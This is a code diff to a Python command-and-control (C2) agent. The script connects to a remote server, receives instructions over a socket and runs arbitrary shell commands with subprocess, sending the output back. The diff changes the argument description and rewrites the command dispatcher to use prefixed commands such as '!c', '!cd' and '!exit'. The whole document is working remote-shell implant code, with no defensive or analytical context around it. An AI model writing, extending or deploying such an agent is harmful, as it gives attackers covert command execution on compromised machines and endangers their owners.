@@ -4,8 +4,9 @@ import os
 import socket
 import getpass
 import argparse
+from time import sleep
 
-parser = argparse.ArgumentParser(description="SSH C2 agent configuration to communicate with server")
+parser = argparse.ArgumentParser(description="C2 agent configuration to communicate with server")
 parser._action_groups.pop()
 required = parser.add_argument_group("Required")
 optional = parser.add_argument_group("Optional")
@@ -39,22 +40,24 @@ def main():
         print(session.recv(1024).decode())
         while True:
             try:
-                command = session.recv(1024).decode()
-                head = command.split(" ")[0]
-                match head:
-                    case "!exit":
-                        exit()
-                    case "cd":
-                        path = " ".join(command.split(" ")[1:])
-                        os.chdir(path)
-                        CWD = os.getcwd()
-                        session.sendall(f"Changed directory to {CWD}\n")
-                    case _:
-                        output = subprocess.getoutput(command)
-                        if (len(output) == 0):
-                            session.sendall("[*] Command executed. No shell output.\n")
-                        else:
-                            session.sendall(output + "\n")
+                incoming = session.recv(1024).decode()
+                head = incoming.split(" ")[0]
+                if head == "!exit":
+                    exit()
+                elif head == "!cd":
+                    path = " ".join(incoming.split(" ")[1:])
+                    os.chdir(path)
+                    CWD = os.getcwd()
+                    session.sendall(f"Changed directory to {CWD}\n")
+                elif head == "!c":
+                    command = " ".join(incoming.split(" ")[1:])
+                    output = subprocess.getoutput(command)
+                    if (len(output) == 0):
+                        session.sendall("[*] Command executed. No shell output.\n")
+                    else:
+                        session.sendall(output + "\n")
+                else:
+                    session.sendall("Invalid.\n")
             except Exception as ex:
                 session.sendall("[!] " + str(ex) + "\n")
 
